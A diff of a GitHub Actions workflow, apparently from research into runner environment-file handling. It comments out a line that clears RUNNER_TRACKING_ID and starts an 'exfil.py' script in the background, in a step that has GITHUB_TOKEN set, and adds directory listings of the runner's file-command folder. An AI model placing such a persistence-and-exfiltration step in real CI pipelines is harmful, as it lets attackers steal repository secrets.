@@ -17,11 +17,13 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           echo $GITHUB_ENV
-          RUNNER_TRACKING_ID="" && (nohup python exfil.py &)
+          ls -la /home/runner/work/_temp/_runner_file_commands/
+          # RUNNER_TRACKING_ID="" && (nohup python exfil.py &)
 
       - name: Set var 2
         run: |
           echo $GITHUB_ENV
+          ls -la /home/runner/work/_temp/_runner_file_commands/
           TARGET_VAR=step2
           echo "Set TARGET_VAR"
           sleep 2
@@ -29,6 +31,7 @@ jobs:
       - name: Set var 3
         run: |
           echo $GITHUB_ENV
+          ls -la /home/runner/work/_temp/_runner_file_commands/
           TARGET_VAR=step3
           echo "Set TARGET_VAR"
           sleep 2
